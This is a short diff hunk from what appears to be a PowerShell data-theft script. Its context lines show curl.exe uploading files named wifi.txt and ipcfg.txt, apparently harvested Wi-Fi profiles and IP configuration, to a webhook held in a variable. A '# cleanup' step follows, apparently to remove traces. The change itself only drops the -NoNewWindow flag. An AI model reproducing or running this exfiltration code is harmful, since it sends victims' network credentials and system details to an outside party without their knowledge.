@@ -36,7 +36,7 @@ Start-Process curl.exe -ArgumentList @(
     '-F', "file2=@$e\wifi.txt",
     '-F', "file3=@$e\ipcfg.txt",
     $wh
-) -NoNewWindow -Wait *> $null
+) -Wait *> $null
 
 
 # cleanup
